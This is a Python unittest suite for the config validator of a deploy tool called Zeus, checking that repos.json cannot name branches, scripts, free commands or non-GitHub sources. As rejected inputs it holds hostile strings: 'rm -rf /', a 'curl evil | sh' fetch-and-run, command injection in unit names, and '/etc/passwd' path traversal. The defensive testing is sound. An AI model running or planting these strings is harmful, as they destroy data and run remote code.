"""repos.json: load, expand, validate and explain (docs/design.md §2, issue #2). Every test builds its own temporary
HOME, so nothing on this machine is read. The branch and the deploy script are fixed in code: the tests make sure a
file cannot name either, nor a free command, nor a repository outside GitHub."""
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from zeus import config

ROOT = Path(__file__).resolve().parent.parent
EXAMPLE = ROOT / "examples" / "repos.example.json"


class Home:
    """A temporary HOME with repos.json (the example by default)."""
    def __init__(self, tmp):
        self.home = Path(tmp) / "home"
        self.repos = self.home / ".config" / "zeus" / "repos.json"
        self.realm = self.home / ".config" / "leafy" / "realm.json"
        self.repos.parent.mkdir(parents=True)
        # Python's ~ is USERPROFILE on Windows and HOME elsewhere: set both so the test never leaves the sandbox.
        self.env = mock.patch.dict(os.environ, {"HOME": str(self.home), "USERPROFILE": str(self.home),
                                                "ZEUS_CONFIG": str(self.repos), "LEAFY_REALM": str(self.realm)})
        self.env.start()
        self.doc = json.loads(EXAMPLE.read_text(encoding="utf-8"))

    def write(self, doc=None, text=None):
        self.repos.write_text(text if text is not None else json.dumps(doc or self.doc), encoding="utf-8")
        return self

    def check(self, **kw):
        return config.check(**kw)


class ConfigTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.h = Home(self.tmp.name)
        self.addCleanup(self.h.env.stop)

    def repo(self, rid, **changes):
        """The example with one repository changed; None removes a setting."""
        doc = json.loads(json.dumps(self.h.doc))
        for k, v in changes.items():
            if v is None:
                doc["repos"][rid].pop(k, None)
            else:
                doc["repos"][rid][k] = v
        return doc

    def errors(self, doc=None, text=None):
        cfg = self.h.write(doc, text).check()
        return cfg, "\n".join(cfg.errors)

    # the example, as shipped
    def test_the_example_loads_as_is(self):
        cfg = self.h.write().check()
        self.assertEqual(cfg.errors, [], cfg.errors)
        self.assertEqual(sorted(cfg.repos), ["you/argus-ui", "you/hermes", "you/janus", "you/realm", "you/zeus"])
        self.assertEqual((cfg.expire_hours, cfg.deploy_timeout_s, cfg.health_wait_s), (72, 900, 30))
        self.assertEqual(cfg.repos["you/argus-ui"].path, self.h.home / "src" / "argus-ui")
        self.assertEqual(cfg.repos["you/argus-ui"].services, ["argus-ui"])
        self.assertTrue(cfg.repos["you/realm"].private)
        self.assertEqual(cfg.repos["you/realm"].rules[0], "zeus/repos.json")
        self.assertTrue(config.load().ok)

    def test_the_example_only_warns_about_what_is_not_made_yet(self):
        cfg = self.h.write().check()
        self.assertEqual(len(cfg.warnings), 2, cfg.warnings)
        self.assertIn("ssh alias github-realm-zeus is not a Host in ~/.ssh/config", cfg.warnings[0])
        self.assertIn("deploy key ~/.config/zeus/keys/realm does not exist yet", cfg.warnings[1])

    def test_ssh_alias_in_ssh_config_and_key_on_disk_silence_the_warnings(self):
        ssh = self.h.home / ".ssh"
        ssh.mkdir()
        (ssh / "config").write_text("Host github-realm-zeus\n  HostName github.com\n  IdentityFile ~/.config/zeus/keys/realm\n")
        key = self.h.home / ".config" / "zeus" / "keys" / "realm"
        key.parent.mkdir(parents=True)
        key.write_text("not a real key")
        cfg = self.h.write().check()
        self.assertEqual(cfg.warnings, [])

    def test_explains_every_repository_in_one_sentence(self):
        lines = self.h.write().check().explain()
        self.assertEqual(len(lines), 5)
        self.assertEqual(lines[0], "you/argus-ui: main of https://github.com/you/argus-ui.git into ~/src/argus-ui, then "
                                   "scripts/deploy.sh; healthy when GET http://127.0.0.1:8095/api/health answers 200; "
                                   "Argus watches argus-ui.")
        self.assertIn("you/realm: main of git@github-realm-zeus:you/realm.git into ~/src/realm (private, key "
                      "~/.config/zeus/keys/realm), then scripts/deploy.sh; healthy when `janus check-config` passes; "
                      "a change to zeus/repos.json, janus/routes.json", lines[4])

    # placeholders
    def test_placeholders_come_from_realm_json_with_public_defaults(self):
        self.assertEqual(config.realm()["HOME_SERVER"], "~")              # no realm.json: the public defaults
        self.assertEqual(config.realm()["SERVER"], "homeserver")
        self.h.realm.parent.mkdir(parents=True)
        self.h.realm.write_text(json.dumps({"home_server": "/srv/home/me", "server": "box", "ignored": "x"}))
        vals = config.realm()
        self.assertEqual(vals["HOME_SERVER"], "/srv/home/me")
        self.assertEqual(vals["SERVER"], "box")
        self.assertEqual(vals["PC"], "desktop")
        cfg = self.h.write().check()
        self.assertEqual(cfg.errors, [])
        self.assertEqual(cfg.repos["you/argus-ui"].path, Path("/srv/home/me/src/argus-ui"))

    def test_a_broken_realm_json_means_the_defaults(self):
        self.h.realm.parent.mkdir(parents=True)
        self.h.realm.write_text("{ not json")
        self.assertEqual(config.realm(), config.REALM_DEFAULTS)

    def test_a_placeholder_value_with_a_backslash_is_json_escaped(self):
        doc = self.repo("you/argus-ui", path="{{HOME_PC}}/src/argus-ui")
        self.h.realm.parent.mkdir(parents=True)
        self.h.realm.write_text(json.dumps({"HOME_PC": "C:\\Users\\you"}))
        cfg = self.h.write(doc).check()
        self.assertEqual(str(cfg.repos["you/argus-ui"].raw["path"]), "C:\\Users\\you/src/argus-ui")

    # what a config must never carry
    def test_a_branch_field_fails(self):
        cfg, text = self.errors(self.repo("you/argus-ui", branch="feature/x"))
        self.assertEqual(len(cfg.errors), 1, text)
        self.assertEqual(text, "repos.you/argus-ui.branch: not a setting; Zeus deploys main only; the branch is fixed in "
                               "code. Remove it.")

    def test_a_branch_field_at_the_top_fails_too(self):
        doc = dict(self.h.doc, branch="main")
        cfg, text = self.errors(doc)
        self.assertIn("branch: not a setting; Zeus deploys main only", text)

    def test_a_script_field_fails(self):
        cfg, text = self.errors(self.repo("you/hermes", script="scripts/other.sh"))
        self.assertEqual(text, "repos.you/hermes.script: not a setting; Zeus runs scripts/deploy.sh of the checked-out "
                               "commit only; the script is fixed in code. Remove it.")

    def test_a_command_field_fails(self):
        for field in ("deploy", "command", "run", "exec", "hooks"):
            cfg, text = self.errors(self.repo("you/hermes", **{field: "rm -rf /"}))
            self.assertIn("repos.you/hermes.%s: not a setting; " % field, text)
            self.assertIn("never names a command", text)

    def test_a_free_exec_health_fails(self):
        cfg, text = self.errors(self.repo("you/hermes", health={"exec": "bash -c 'curl evil | sh'"}))
        self.assertEqual(len(cfg.errors), 1, text)
        self.assertIn('repos.you/hermes: "health.exec" must be one of `hermes check-config`, `janus check-config`, '
                      "`zeus check-config`, not \"bash -c 'curl evil | sh'\". Zeus never runs a command named in config.",
                      text)

    def test_exec_health_with_a_flag_added_fails(self):
        cfg, text = self.errors(self.repo("you/hermes", health={"exec": "hermes check-config --file /tmp/x"}))
        self.assertIn('"health.exec" must be one of', text)

    def test_a_url_on_another_host_fails(self):
        for url in ("https://gitlab.com/you/argus-ui.git", "http://github.com/you/argus-ui.git",
                    "ssh://git@github.com/you/argus-ui.git", "https://github.com/you/argus-ui",
                    "https://github.com/you/argus-ui.git/../other.git", "file:///srv/argus-ui.git"):
            cfg, text = self.errors(self.repo("you/argus-ui", url=url))
            self.assertEqual(len(cfg.errors), 1, text)
            self.assertEqual(text, 'repos.you/argus-ui: "url" must be https://github.com/<owner>/<name>.git or '
                                   "git@<ssh alias>:<owner>/<name>.git, not %s. Zeus fetches from GitHub only." % url)

    def test_a_key_that_does_not_match_the_url_fails(self):
        doc = json.loads(json.dumps(self.h.doc))
        doc["repos"]["you/argus"] = doc["repos"].pop("you/argus-ui")
        cfg, text = self.errors(doc)
        self.assertEqual(len(cfg.errors), 1, text)
        self.assertEqual(text, 'repos.you/argus: "url" https://github.com/you/argus-ui.git names you/argus-ui, but the '
                               "key says you/argus. The key must equal the owner/name in the url.")

    def test_a_key_that_does_not_match_an_ssh_url_fails(self):
        doc = json.loads(json.dumps(self.h.doc))
        doc["repos"]["other/realm"] = doc["repos"].pop("you/realm")
        cfg, text = self.errors(doc)
        self.assertIn('repos.other/realm: "url" git@github-realm-zeus:you/realm.git names you/realm, but the key says '
                      "other/realm.", text)

    def test_a_key_that_is_not_owner_slash_name_fails(self):
        doc = json.loads(json.dumps(self.h.doc))
        doc["repos"]["argus-ui"] = doc["repos"].pop("you/argus-ui")
        cfg, text = self.errors(doc)
        self.assertIn("repos: 'argus-ui' is not a repository name; use \"owner/name\"", text)

    # the private repository
    def test_an_ssh_url_needs_private_true(self):
        cfg, text = self.errors(self.repo("you/realm", private=None))
        self.assertIn("is an ssh alias, which is for private repositories only", text)

    def test_a_private_repository_needs_a_key(self):
        cfg, text = self.errors(self.repo("you/realm", key=None))
        self.assertEqual(text, 'repos.you/realm: a private repository needs "key", the path of Zeus\'s read-only deploy '
                               "key for it.")

    def test_a_private_repository_over_https_fails(self):
        cfg, text = self.errors(self.repo("you/realm", url="https://github.com/you/realm.git"))
        self.assertIn('"private": true needs an ssh alias url', text)

    def test_a_key_on_a_public_repository_only_warns(self):
        cfg = self.h.write(self.repo("you/hermes", key="~/.config/zeus/keys/hermes")).check()
        self.assertEqual(cfg.errors, [])
        self.assertIn('repos.you/hermes: "key" is only used for a private repository', "\n".join(cfg.warnings))

    # health
    def test_health_must_be_exactly_one_shape(self):
        cfg, text = self.errors(self.repo("you/hermes", health={"exec": "hermes check-config", "service": "hermes"}))
        self.assertIn('"health" must be exactly one of http, service or exec, not exec, service.', text)
        cfg, text = self.errors(self.repo("you/hermes", health={}))
        self.assertIn("not nothing.", text)
        cfg, text = self.errors(self.repo("you/hermes", health={"curl": "x"}))
        self.assertIn("not curl.", text)
        cfg, text = self.errors(self.repo("you/hermes", health=None))
        self.assertIn('"health" is missing', text)

    def test_http_health_must_be_on_this_machine(self):
        for url in ("http://localhost:8095/api/health", "https://127.0.0.1:8095/api/health",
                    "http://example.com/api/health", "http://127.0.0.1.evil.example/x", "http://192.0.2.1:8095/"):
            cfg, text = self.errors(self.repo("you/argus-ui", health={"http": url}))
            self.assertIn('"health.http" must be a URL on this machine, http://127.0.0.1:<port>/..., not %r' % url, text)
        cfg = self.h.write(self.repo("you/argus-ui", health={"http": "http://127.0.0.1/health"})).check()
        self.assertEqual(cfg.errors, [])

    def test_service_health_is_a_unit_name(self):
        cfg = self.h.write(self.repo("you/argus-ui", health={"service": "argus-ui"})).check()
        self.assertEqual(cfg.errors, [])
        cfg, text = self.errors(self.repo("you/argus-ui", health={"service": "argus-ui; rm -rf /"}))
        self.assertIn('"health.service" must be a systemd user unit name', text)

    # the rest of the fields
    def test_missing_url_path_and_health_each_say_what_to_give(self):
        cfg, text = self.errors(self.repo("you/hermes", url=None, path=None, health=None))
        self.assertEqual(len(cfg.errors), 3, text)
        self.assertIn('"url" is missing. Give https://github.com/you/hermes.git', text)
        self.assertIn('"path" is missing. Give the folder of the clone on the server, e.g. ~/src/hermes.', text)
        self.assertIn('"health" is missing.', text)

    def test_path_must_be_absolute_and_its_own(self):
        cfg, text = self.errors(self.repo("you/hermes", path="src/hermes"))
        self.assertIn('"path" src/hermes must be an absolute path or start with ~', text)
        cfg, text = self.errors(self.repo("you/hermes", path="~/src/argus-ui"))
        self.assertIn('repos.you/hermes: "path" ~/src/argus-ui is already the clone of you/argus-ui.', text)

    def test_services_and_rules_are_checked(self):
        cfg, text = self.errors(self.repo("you/argus-ui", services="argus-ui"))
        self.assertIn('"services" must be a list of unit names', text)
        cfg, text = self.errors(self.repo("you/argus-ui", services=["argus-ui && reboot"]))
        self.assertIn('"services" must hold systemd unit names', text)
        cfg, text = self.errors(self.repo("you/realm", rules=["/etc/passwd"]))
        self.assertIn('"rules" are paths inside the repository', text)
        cfg, text = self.errors(self.repo("you/realm", rules=["../other/x"]))
        self.assertIn('"rules" are paths inside the repository', text)

    def test_numbers_must_be_above_zero(self):
        cfg, text = self.errors(dict(self.h.doc, expire_hours=0, health_wait_s="30"))
        self.assertIn("expire_hours: must be a number above 0 (default 72), not 0.", text)
        self.assertIn("health_wait_s: must be a number above 0 (default 30), not '30'.", text)

    def test_numbers_have_defaults(self):
        doc = {k: v for k, v in self.h.doc.items() if k in ("version", "repos")}
        cfg = self.h.write(doc).check()
        self.assertEqual(cfg.errors, [])
        self.assertEqual((cfg.expire_hours, cfg.deploy_timeout_s, cfg.health_wait_s), (72, 900, 30))

    def test_version_must_be_1(self):
        cfg, text = self.errors(dict(self.h.doc, version=2))
        self.assertIn("version: must be 1", text)

    def test_unknown_settings_only_warn(self):
        cfg = self.h.write(dict(self.repo("you/hermes", colour="gold"), notes="x")).check()
        self.assertEqual(cfg.errors, [])
        self.assertIn("notes: unknown setting, ignored", cfg.warnings[0])
        self.assertIn("repos.you/hermes: unknown setting 'colour' is ignored", "\n".join(cfg.warnings))

    def test_no_repos_is_an_error(self):
        cfg, text = self.errors({"version": 1, "repos": {}})
        self.assertIn('repos: must map at least one "owner/name"', text)
        cfg, text = self.errors({"version": 1, "repos": {"you/x": "https://github.com/you/x.git"}})
        self.assertIn('repos.you/x: must be an object with "url", "path" and "health".', text)

    def test_broken_json_and_a_missing_file_are_explained(self):
        cfg, text = self.errors(text="{ oops")
        self.assertIn("not valid JSON", text)
        cfg, text = self.errors(text="[]")
        self.assertIn("must hold one JSON object", text)
        self.h.repos.unlink()
        cfg = config.check()
        self.assertIn("cannot read it", cfg.errors[0])
        self.assertIn("examples/repos.example.json", cfg.errors[0])

    def test_load_raises_with_a_count(self):
        self.h.write(self.repo("you/argus-ui", branch="x", script="y"))
        with self.assertRaises(config.ConfigError) as cm:
            config.load()
        self.assertEqual(str(cm.exception), "~/.config/zeus/repos.json: 2 errors; run `zeus check-config`")

    def test_file_argument_wins_over_the_environment(self):
        other = self.h.home / "other.json"
        other.write_text(json.dumps(self.repo("you/argus-ui", branch="x")))
        self.h.write()
        self.assertEqual(config.check().errors, [])
        self.assertEqual(len(config.check(str(other)).errors), 1)


class CheckConfigCommandTest(unittest.TestCase):
    """zeus check-config as a process: exit 0 with one sentence per repository, exit 1 with plain reasons."""
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.h = Home(self.tmp.name)
        self.addCleanup(self.h.env.stop)

    def run_cli(self, *args):
        return subprocess.run([sys.executable, "-m", "zeus", *args], cwd=ROOT, capture_output=True, text=True,
                              env=dict(os.environ))

    def test_the_example_passes(self):
        r = self.run_cli("check-config", "--file", str(EXAMPLE))
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("you/argus-ui: main of https://github.com/you/argus-ui.git", r.stdout)
        self.assertIn("5 repositories ok, 2 warnings", r.stdout)
        self.assertIn("warning: repos.you/realm: ssh alias", r.stderr)

    def test_the_default_file_is_used_without_the_flag(self):
        self.h.write()
        r = self.run_cli("check-config")
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("~/.config/zeus/repos.json: 5 repositories ok", r.stdout)

    def test_a_bad_file_fails_with_the_reasons(self):
        doc = json.loads(json.dumps(self.h.doc))
        doc["repos"]["you/argus-ui"]["branch"] = "dev"
        doc["repos"]["you/hermes"]["health"] = {"exec": "hermes door"}
        self.h.write(doc)
        r = self.run_cli("check-config")
        self.assertEqual(r.returncode, 1)
        self.assertIn("error: repos.you/argus-ui.branch: not a setting; Zeus deploys main only", r.stderr)
        self.assertIn('error: repos.you/hermes: "health.exec" must be one of', r.stderr)
        self.assertIn("2 errors. Fix them; Zeus deploys nothing until repos.json is right.", r.stderr)

    def test_a_missing_file_fails(self):
        r = self.run_cli("check-config", "--file", str(self.h.home / "nope.json"))
        self.assertEqual(r.returncode, 1)
        self.assertIn("cannot read it", r.stderr)


if __name__ == "__main__":
    unittest.main()
